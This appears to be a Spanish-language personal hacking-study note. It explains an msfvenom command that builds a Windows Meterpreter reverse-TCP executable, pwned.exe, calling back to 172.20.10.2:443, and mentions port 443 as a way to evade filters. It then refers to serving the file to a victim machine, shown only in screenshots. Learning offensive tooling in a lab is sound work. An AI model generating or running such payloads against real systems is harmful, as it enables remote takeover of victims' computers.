____


Vamos  crear un exploit manualmente para generar una reverse shell con meterpreter:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=443 -f exe -o pwned.exe
```

### Parámetros:
____
- **msfvenom** : Herramienta del framework Metasploit para **generar/transformar payloads** (binarios, scripts, etc.). Combina funciones de `msfpayload` y `msfencode`.
- **-p** : Abreviatura de **payload** — indica **qué código** incluir en el binario. En este caso lo que seguirá a `-p` es el identificador del payload.
- **windows/x64/meterpreter/reverse_tcp**  
    El **payload** elegido:
    
    - `windows` → plataforma objetivo (SO).
        
    - `x64` → arquitectura (64-bit).
        
    - `meterpreter` → tipo de payload (shell/payload avanzado con funcionalidades interactivas).
        
    - `reverse_tcp` → modalidad de conexión: el payload **inicia** una conexión de vuelta al atacante (reverse), usando TCP.

- **LHOST=172.20.10.2** : Parámetro del payload que define la **IP de escucha** del atacante (la dirección a la que el payload intentará conectarse). LHOST = _listen host_.
- **LPORT=443**  
    Parámetro del payload que define el **puerto de escucha** en el host atacante. LPORT = _listen port_. Aquí usan 443 (puerto HTTPS habitual) por motivos de tránsito/evadir filtros en algunos entornos.
- **-f exe**  
    **Formato de salida**: `-f` indica en qué contenedor/archivo se empaqueta el payload; `exe` es un ejecutable de Windows (.exe). Otros ejemplos: `-f elf`, `-f dll`, `-f raw`, `-f python`, etc.
- **-o pwned.exe**  
    **Archivo de salida**: `-o` (output) especifica el nombre del fichero que se creará. En este caso se guardará el ejecutable como `pwned.exe`.


![Pasted image 20251016131849](Hacking-repo-obs/Anexos/Pasted%20image%2020251016131849.png)

Ahora lo transferimos a la máquina víctima por un servidor http en python:

![Pasted image 20251016131951](Hacking-repo-obs/Anexos/Pasted%20image%2020251016131951.png)


![Pasted image 20251016132527](Hacking-repo-obs/Anexos/Pasted%20image%2020251016132527.png)

![Pasted image 20251016132610](Hacking-repo-obs/Anexos/Pasted%20image%2020251016132610.png)